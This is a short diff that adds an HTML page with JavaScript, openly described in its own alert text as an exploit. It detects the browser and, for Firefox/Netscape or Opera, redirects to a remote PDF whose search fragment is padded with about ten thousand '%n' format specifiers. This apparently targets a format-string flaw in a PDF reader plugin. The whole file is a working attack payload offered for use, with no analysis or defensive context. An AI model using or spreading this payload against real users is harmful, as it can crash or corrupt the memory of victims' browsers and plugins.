@@ -1,0 +1,29 @@
+<script language="javascript">
+var browserName=navigator.appName;
+
+if (browserName=="Netscape")
+{var f = ""
+var c = ""
+ for (var i = 0; i <= 10000; i++) {
+ var f = f + "%n";
+ }
+document.location = "http://www.shinnai.altervista.org/pucca.pdf#search=" + (f)
+}
+else if (browserName=='Opera')
+{var f = ""
+var c = ""
+ for (var i = 0; i <= 10000; i++) {
+ var f = f + "%n";
+ }
+document.location = "http://www.shinnai.altervista.org/pucca.pdf#search=" + (f)
+}
+else if (browserName=='Microsoft Internet Explorer')
+{
+alert("This exploit doesn't work with IE. You need to use Firefox and stuff like that.");
+document.location="http://www.shinnai.altervista.org";
+}
+else
+{
+alert("Mmm... I don't know what are you browsing with here, so no martini no party.");
+}
+</script>
